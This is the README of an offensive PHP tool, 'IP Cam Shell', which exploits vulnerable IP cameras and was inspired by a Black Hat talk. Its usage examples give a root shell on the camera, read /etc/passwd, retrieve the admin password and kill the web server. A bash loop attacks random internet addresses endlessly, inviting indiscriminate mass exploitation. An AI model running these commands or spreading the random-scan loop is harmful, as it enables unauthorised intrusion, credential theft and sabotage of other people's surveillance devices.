IP Cam Shell
=======

IPCS is a command line script for testing and exploiting a wide range of IP cameras as demonstrated by Craig Heffner in "Exploiting Surveillance Cameras Like a Hollywood Hacker". See the slides here: https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-WP.pdf

A copy of the slides is included in the repository.

Requirements
=======

 * PHP 5
 * A distribution of Linux. I haven't and won't test this on Windows.

Usage
=======

Basic Usage
-------

Using IPCS is pretty straight forward. You pass the URL to ipcs.php via the -u option. 

```
$ php ipcs.php -u http://192.168.0.3:8080
```

If the camera is vulnerable you'll be dropped in to a "shell" as root and be able to exploit the camera further.

```
$ php ipcs.php -u http://192.168.0.3:8080
Those who do not understand UNIX are condemned to reinvent it, poorly. — Henry Spencer
ipcamshell>
```

It's very much like being logged in to a stripped down Unix server as root.

```
ipcamshell> whoami
root
ipcamshell> id
uid=0(root) gid=0(root)
ipcamshell> ls /
bin
dev
etc
lib
linuxrc
mnt
opt
proc
sbin
scripts
tmp
usr
var
ipcamshell> cat /etc/passwd
root:x:0:0:Linux User,,,:/:/bin/sh
```

Use `quit`, `exit`, or `^C` to exit.

Further Attacks
-------
Of course it wouldn't be very fun without the ability to login and view the camera... 

```
ipcamshell> getadminpass
Username: admin
Password: hunter2
```

If you wish to kill the web server (to prevent someone from accessing the web interface temporarily), run the `killswitch` command. Note that the camera will continue to record regardless of this. Shutting the server down *might* switch the camera off, although that's complete speculation.



If the camera isn't vulnerable, the server isn't up, or the internet hates you, you'll recieve the following message:

```
Sorry, the server specified isn't vulnerable.
```

Automation
-------

IPCS has the potential to be automated in different ways. This, I'm going to leave to you. The `-c` option won't drop you in to a shell after successfully exploiting a server, and the `-g` option surpresses the "Sorry, the server specified isn't vulnerable." messages for failed attempts.

As an example, the following bash script will forever try to attack randomly generated IPv4 addresses.

```
#!/bin/bash
while true; do export ip=$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)) && echo "Trying $ip..." && php ipcs.php -c 1 -g 1 -u http://$ip; done;
```

This is slow, and will likely yield nothing without *extremely* good luck. Use your imagination. :)

Note
=======
I do not claim the description or purpose of this tool to be 100% accurate. If you see anything which is incorrect in this document, please submit a pull request or open a new issue.
